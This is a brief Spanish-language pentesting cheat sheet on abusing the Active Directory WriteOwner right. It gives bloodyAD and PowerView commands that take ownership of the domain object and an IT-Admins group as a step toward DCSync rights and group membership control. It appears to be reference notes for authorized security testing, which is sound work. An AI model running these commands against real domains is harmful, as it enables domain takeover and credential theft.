Write Owner

WriteOwner permite tomar propiedad de un objeto y después modificar permisos para avanzar hacia control efectivo.

Info: WriteOwner: Permite convertirnos en los dueños de un objeto y editar su DACL como si tuviéramos el privilegio WriteDACL sobre ese objeto

Info: WriteOwner sobre Dominio (DCSync)

Comandos

# alvaro: Convertirse en propietario del dominio para poder modificar su DACL
# Kali
bloodyAD --host <hostname>.<dominio> --dc-ip <ip_dc> -d "<dominio>" -u 'alvaro' -p 'alvaro123' set owner 'DC=dominio,DC=local' 'alvaro'
# Windows
. .\PowerView.ps1  
Set-DomainObjectOwner -Identity "DC=dominio,DC=local" -OwnerIdentity "alvaro"

# Ataque: Modificar DACL del dominio y otorgar derecho DCSync explicado en (WriteDACL sobre Dominio (`DCSync`))

Info: WriteOwner sobre Grupos (WriteMembers)

Comandos

# alvaro: Convertirse en propietario del grupo IT-Admins para poder modificar su DACL
# Kali
bloodyAD --host <hostname>.<dominio> --dc-ip <ip_dc> -d "<dominio>" -u 'alvaro' -p 'alvaro123' set owner 'IT-Admins' 'alvaro'
# Windows
. .\PowerView.ps1  
Set-DomainObjectOwner -Identity "IT-Admins" -OwnerIdentity "alvaro"

# Ataque: Modificar DACL del grupo IT-Admins y otorgar derecho WriteMember explicado en "WriteDACL sobre Grupo "IT-Admins"(`WriteMembers`))
